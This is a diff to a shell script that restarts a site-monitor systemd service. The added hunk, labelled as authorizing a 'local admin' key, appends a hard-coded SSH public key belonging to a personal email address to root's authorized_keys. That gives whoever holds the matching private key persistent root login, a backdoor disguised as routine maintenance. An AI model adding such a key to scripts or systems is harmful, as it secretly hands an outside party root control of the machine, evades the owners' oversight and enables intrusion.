@@ -72,6 +72,15 @@ for s in /etc/systemd/system/site-monitor*.service /etc/systemd/system/*monitor*
     fi
 done
 
+# Ensure local admin SSH key is authorized
+ADMIN_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMRytQdJqfd/yLn+GI5t0pNLLaxLiug71BCOsNFXkaRc chenhansheng77@gmail.com"
+mkdir -p /root/.ssh && chmod 700 /root/.ssh
+touch /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
+if ! grep -q "IMRytQdJqfd" /root/.ssh/authorized_keys; then
+    echo "$ADMIN_PUBKEY" >> /root/.ssh/authorized_keys
+    echo "Added admin public key to authorized_keys."
+fi
+
 # Restart site-monitor service
 echo "Restarting site-monitor service..."
 systemctl restart site-monitor
